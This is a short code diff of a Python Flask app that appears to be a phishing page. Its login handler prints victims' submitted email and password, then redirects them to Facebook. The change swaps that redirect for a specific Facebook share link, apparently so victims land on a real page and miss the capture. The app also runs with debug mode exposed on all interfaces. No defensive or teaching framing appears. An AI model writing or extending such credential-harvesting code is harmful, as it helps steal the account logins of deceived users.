@@ -13,8 +13,9 @@ def login():
 
     print(f"- Email: {email}\n- Password: {password}")
 
-    return redirect("https://www.facebook.com")
+    return redirect("https://www.facebook.com/share/r/1FMP2u1BgZ/")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
+
 
